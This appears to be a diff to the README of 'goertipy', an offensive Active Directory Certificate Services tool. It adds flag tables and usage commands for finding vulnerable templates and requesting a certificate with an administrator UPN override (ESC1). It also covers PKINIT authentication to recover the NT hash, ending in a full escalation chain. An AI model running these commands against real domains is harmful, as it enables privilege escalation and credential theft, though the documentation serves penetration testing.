@@ -48,7 +48,28 @@ goertipy find -u user@corp.local --dc-ip 10.0.0.1 --vulnerable
 goertipy find -u user@corp.local --dc-ip 10.0.0.1 --json
 ```
 
+| Flag | Short | Description |
+|------|-------|-------------|
+| `--username` | `-u` | Username (user@domain or DOMAIN\user) |
+| `--password` | `-p` | Password (prompted if omitted) |
+| `--hashes` | `-H` | NTLM hash (LM:NT or :NT) |
+| `--domain` | `-d` | Target domain |
+| `--dc-ip` | | Domain Controller IP |
+| `--scheme` | | LDAP scheme: `ldap` or `ldaps` (default: ldaps) |
+| `--json` | | JSON output |
+| `--no-color` | | Disable colored output |
+| `--vulnerable` | | Show only vulnerable templates |
+| `--enabled` | | Show only enabled templates |
+| `--hide-admins` | | Hide default admin permissions |
+| `--verbose` | `-v` | Verbose output |
+| `--debug` | | Debug output |
+| `--output` | `-o` | Output file prefix |
+
+---
+
 ### Req (Request Certificates)
+
+Three transport options for enrollment:
 
 ```bash
 # Request via RPC (default — resolves endpoint via EPM on port 135)
@@ -64,14 +85,39 @@ goertipy req -u user@corp.local --web http://ca.corp.local --ca 'corp-CA' --temp
 goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' \
   --template VulnTemplate --upn administrator@corp.local
 
-# Retrieve a pending certificate
+# Retrieve a pending certificate (works with all transports)
 goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' --retrieve 42
+goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' --retrieve 42 --pipe
+goertipy req -u user@corp.local --web http://ca.corp.local --ca 'corp-CA' --retrieve 42
 ```
+
+| Flag | Short | Description |
+|------|-------|-------------|
+| `--ca` | | CA name (e.g., `corp-CA`) |
+| `--template` | | Certificate template name |
+| `--dc-ip` | | CA server IP (for RPC/pipe transport) |
+| `--web` | | HTTP/HTTPS enrollment URL (e.g., `http://ca.corp.local`) |
+| `--pipe` | | Use SMB named pipe transport (port 445) |
+| `--username` | `-u` | Username |
+| `--password` | `-p` | Password (prompted if omitted) |
+| `--hashes` | `-H` | NTLM hash (LM:NT or :NT) |
+| `--domain` | `-d` | Target domain |
+| `--upn` | | UPN SAN override (for ESC1) |
+| `--dns` | | DNS SAN override |
+| `--subject` | | Certificate subject CN |
+| `--retrieve` | | Retrieve pending cert by request ID |
+| `--key-size` | | RSA key size (default: 2048) |
+| `--output` | `-o` | Output file prefix |
+| `--debug` | | Debug output |
+
+---
 
 ### Auth (PKINIT Authentication)
 
+Authenticate with a certificate and recover the NT hash — combines `gettgtpkinit` + `getnthash` into one command:
+
 ```bash
-# Authenticate with PFX and recover NT hash (TGT + U2U in one step)
+# Authenticate with PFX and recover NT hash
 goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 --pfx admin.pfx
 
 # Skip NT hash recovery
@@ -79,7 +125,25 @@ goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 --pfx admin.pfx --no-
 
 # Custom output path
 goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 --pfx admin.pfx -o admin.ccache
+
+# Base64-encoded PFX (useful for scripting)
+goertipy auth -u admin@corp.local --dc-ip 10.0.0.1 --pfx-base64 "MIIJ..."
 ```
+
+| Flag | Short | Description |
+|------|-------|-------------|
+| `--pfx` | | PFX/PKCS12 certificate file |
+| `--pfx-pass` | | PFX password (default: empty) |
+| `--pfx-base64` | | PFX as base64 string |
+| `--dc-ip` | | Domain Controller IP |
+| `--username` | `-u` | Username (user@domain or DOMAIN\user) |
+| `--domain` | `-d` | Target domain |
+| `--output` | `-o` | Output ccache filename |
+| `--no-hash` | | Skip NT hash recovery (U2U) |
+| `--verbose` | `-v` | Verbose output |
+| `--debug` | | Debug output |
+
+---
 
 ### ESC1 Full Chain Example
 
@@ -93,7 +157,7 @@ goertipy req -u user@corp.local --dc-ip 10.0.0.1 --ca 'corp-CA' \
 
 # 3. Authenticate and recover NT hash
 goertipy auth -u administrator@corp.local --dc-ip 10.0.0.1 \
-  --pfx corp-CA_certificate.pfx
+  --pfx corp-CA_VulnTemplate.pfx
 ```
 
 ## Transport Options
